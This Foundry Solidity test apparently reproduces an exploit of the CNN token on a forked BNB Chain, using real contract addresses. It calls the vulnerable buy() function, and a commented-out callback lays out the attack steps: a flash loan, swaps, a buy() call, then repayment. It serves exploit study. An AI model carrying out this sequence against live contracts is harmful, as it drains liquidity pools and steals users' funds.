// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// This is a variant test. The purpose of this test is to understand the exploit better. This is not the actual test!
// This is a variant test. The purpose of this test is to understand the exploit better. This is not the actual test!
// This is a variant test. The purpose of this test is to understand the exploit better. This is not the actual test!

interface ICNNPair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface ICNNRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IBuyContract {
    function buy() external;
}

contract CNN is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 CNN = IERC20(0xDfb974e8627596Cac099B989cB993ed07Fe46cd6);
    IDPPOracle DPPOracle =
        IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    ICNNPair CNNPair = ICNNPair(0x4d442Da9BF6eD73D19d6B1b163c9d57d539f52ac);
    ICNNRouter CNNRouter =
        ICNNRouter(0x35f3e7CeCC2e29C05C32A9eCE006ea365D5Ad927);
    IBuyContract CNNContract =
        IBuyContract(0x5a3243dA39Ffd745621C5A48FFd60642db2c127a);
    address AttackContract = 0xbd1c57965774540abB291b8bFDeA5Cb1071fca77;

    function setUp() external {
        // Before the exploit
        vm.createSelectFork("https://rpc.ankr.com/bsc", 28523050); 

        // After the exploit, cannot call buy() anymore
        // vm.createSelectFork("https://rpc.ankr.com/bsc", 31134981);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(CNN), "CNN");
        vm.label(address(CNNContract), "CNNContract");
        vm.label(address(CNNRouter), "CNNRouter");
        vm.label(address(CNNPair), "CNNPair");
    }

    function testCNNExploit() public {
        emit log_named_decimal_uint("Pair CNN Balance", CNN.balanceOf(address(CNNPair)), 18);
        emit log_named_decimal_uint("Pair BUSDT Balance", BUSDT.balanceOf(address(CNNPair)), 18);
        emit log_named_decimal_uint("CNNContract BUSDT Balance", BUSDT.balanceOf(address(CNNContract)), 18);
        CNNContract.buy();
        emit log_named_decimal_uint("CNNContract BUSDT Balance", BUSDT.balanceOf(address(CNNContract)), 18);
        emit log_named_decimal_uint("Pair CNN Balance", CNN.balanceOf(address(CNNPair)), 18);
        emit log_named_decimal_uint("Pair BUSDT Balance", BUSDT.balanceOf(address(CNNPair)), 18);
        deal(address(BUSDT), address(this), 0);
        emit log_named_decimal_uint(
            "Attacker BUSDT Balance at start",
            BUSDT.balanceOf(address(this)),
            18
        );



        // DPPOracle.flashLoan(0, 15000 ether, address(this), new bytes(1));
        emit log_named_decimal_uint(
            "Attacker BUSDT Balance at end",
            BUSDT.balanceOf(address(this)),
            18
        );
    }

    // function DPPFlashLoanCall(
    //     address sender,
    //     uint baseAmt,
    //     uint quoteAmt,
    //     bytes calldata data
    // ) external {
    //     BUSDT.transfer(address(CNNPair), 15000 ether);
    //     CNNPair.swap(0, 674346636483490303636287, address(this), "");
    //     CNNContract.buy();
    //     CNN.transfer(address(CNNPair), CNN.balanceOf(address(this)));
    //     CNNPair.swap(20573966445436340960031, 0, address(this), "");
    //     BUSDT.transfer(msg.sender, quoteAmt);
    // }
}
